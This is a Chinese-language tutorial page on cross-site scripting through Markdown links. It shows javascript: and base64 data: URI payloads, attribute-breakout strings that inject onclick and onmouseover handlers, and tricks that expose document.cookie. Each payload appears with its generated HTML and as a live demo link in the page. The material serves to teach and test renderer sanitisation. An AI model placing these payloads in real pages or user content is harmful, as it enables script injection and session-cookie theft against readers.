# Markdown XSS 連結攻擊



## 執行 JavaScript alert

***程式碼***

```markdown
[執行 JavaScript alert][JsAlert]
[JsAlert]: javascript:alert(123);
```

***產生 Markdown HTML***

```html
<a href="javascript:alert(123);" target="_blank">執行 JavaScript alert</a>
```

***Demo***

[執行 JavaScript alert][JsAlert]


## 執行 JavaScript prompt

***程式碼***

```markdown
[執行 JavaScript Promtp][JsPromtp]
[JsPromtp]: javascript:prompt(document.cookie,'這是你的cookie')
```

***產生 Markdown HTML***

```html
<a href="javascript:prompt(document.cookie,'這是你的cookie')" target="_blank">執行 JavaScript Promtp</a>
```

***Demo***

[執行 JavaScript Promtp][JsPromtp]



## 執行 base64 JavaScript alert


***轉換 javascript 程式為 base64 字串***

> [base64 轉換網站](https://www.base64encode.org/)

```
HTML： <script>alert('XSS')</script>

base64： PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

***程式碼***

```markdown
[執行 base64 JavaScript alert](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

***產生 Markdown HTML***

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" target="_blank">執行 base64 JavaScript alert</a>
```

***Demo***

[執行 base64 JavaScript alert](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)





## 滑鼠點擊事件 onclick

***程式碼***

```markdown
[滑鼠點擊事件 onclick][htmlOnClick]
[htmlOnClick]: http://www.google.com.tw/#"onclick='alert(123)'
```

***產生 Markdown HTML***

```html
<a href="http://www.google.com.tw/#" onclick='alert(123)' target="_blank">滑鼠點擊事件 onclick</a>
```

***Demo***

[滑鼠點擊事件 onclick][htmlOnClick]

> 在 gitbook 有將特殊字元 " 字串轉換成無法執行的 ```&quot;```，所以 gitbook 沒有這方面的漏洞







## 滑鼠滑過事件 onmouseover

***程式碼***

```markdown
[滑鼠滑過事件 onmouseover][htmlOnMouseOver]
[htmlOnMouseOver]: http://www.google.com.tw/#"onmouseover='alert(123)'
```

***產生 Markdown HTML***

```html
<a href="http://www.google.com.tw/#" onmouseover='alert(123)' target="_blank">滑鼠滑過事件 onmouseover</a>
```

***Demo***

[滑鼠滑過事件 onmouseover][htmlOnMouseOver]

> 在 gitbook 有將特殊字元 " 字串轉換成無法執行的 ```&quot;```，所以 gitbook 沒有這方面的漏洞








### 擷取你的 cookie

```markdown
[擷取你的 cookie][JsCookie]
[JsCookie]: javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);
```

***產生 Markdown HTML***

```html
<a href="javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);" target="_blank">擷取你的 cookie</a>
```

***Demo***

[擷取你的 cookie][JsCookie]



## 錯誤事件處理 onerror

***程式碼***

```markdown
[錯誤事件處理 onerror](javascript:window.onerror=alert;throw%20document.cookie)
```

***產生 Markdown HTML***

```html
<a href="javascript:window.onerror=alert;throw%20document.cookie" target="_blank">錯誤事件處理 onerror</a>
```

***Demo***

[錯誤事件處理 onerror](javascript:window.onerror=alert;throw%20document.cookie)




## 參考資料
* [XSS等web安全漏洞的防范](http://deadhorse.me/nodejs/2012/09/20/xss_in_cnode.html)
* [Exploiting Markdown Syntax and Telescope Persistent XSS through Markdown (CVE-2014-5144)](http://shubh.am/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/)



[JsAlert]: javascript:alert(123);
[htmlOnClick]: http://www.google.com.tw/#"onclick='alert(123)'
[htmlOnMouseOver]: http://www.google.com.tw/#"onmouseover='alert(123)'
[JsCookie]: javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);
[JsPromtp]: javascript:prompt(document.cookie,'這是你的cookie')